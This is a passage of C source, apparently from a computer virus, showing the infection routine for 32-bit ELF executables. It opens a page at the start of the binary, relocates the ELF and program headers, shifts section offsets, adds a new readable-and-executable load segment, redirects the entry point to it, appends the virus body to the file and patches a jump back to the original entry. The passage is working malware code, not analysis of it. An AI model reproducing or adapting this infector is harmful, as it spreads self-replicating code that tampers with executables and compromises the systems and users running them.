	for (i = 0; i < ehdr->e_phnum; i++)
		/* find read-only segment */
		if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0) {
			MAKE_HOLE(0, 4096);
			/* copy ELF header */
			memmove(m, m + 4096, sizeof(Elf32_Ehdr));
			ehdr = (Elf32_Ehdr*)m;
			/* copy PHDRs */
			memmove(m + sizeof(Elf32_Ehdr), m + 4096 + ehdr->e_phoff, ehdr->e_phnum * sizeof(Elf32_Phdr));
			ehdr->e_phoff = sizeof(Elf32_Ehdr);
			phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
			/* fix reference to section table */
			ehdr->e_shoff += 4096;
			shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);
			/* adjust text segment */
			phdr[i].p_vaddr -= 4096;
			phdr[i].p_filesz += 4096;
			phdr[i].p_memsz += 4096;
			uint32_t u = phdr[i].p_vaddr;
			/* fix PHT */
			for (i = 0; i < ehdr->e_phnum; i++)
				if (phdr[i].p_type == PT_PHDR) {
					phdr[i].p_offset = sizeof(Elf32_Ehdr);
					phdr[i].p_vaddr = phdr[i].p_paddr = u + sizeof(Elf32_Ehdr);
				} else if (phdr[i].p_offset > 0)
					phdr[i].p_offset += 4096;
			/* fix SHT */
			for (i = 1; i < ehdr->e_shnum; i++)
				if (shdr[i].sh_offset)
					shdr[i].sh_offset += 4096;
			i = ehdr->e_phnum;
			/* add new segment table entry */
			phdr[i].p_type = PT_LOAD;
			phdr[i].p_offset = l;
			phdr[i].p_vaddr = phdr[i].p_paddr = u - 8192 + (l & 0xfff);
			phdr[i].p_filesz = g->size;
			phdr[i].p_memsz = g->size;
			phdr[i].p_flags = PF_R | PF_X;
			phdr[i].p_align = 0x1000;
			/* set the entry point */
			ehdr->e_entry = phdr[i].p_vaddr;
			ehdr->e_phnum++;
			u = old_entry - phdr[i].p_vaddr - 12;
			/* clean the grabage */
			for (i = (char*)&phdr[ehdr->e_phnum] - m; i < shdr[1].sh_offset; i++)
				m[i] = 0;
			/* write the virus body */
			lseek(h, 0, 2);
			write(h, g->self, g->size);
			pwrite(h, &u, 4, l + 8, 0);
			break;
		}
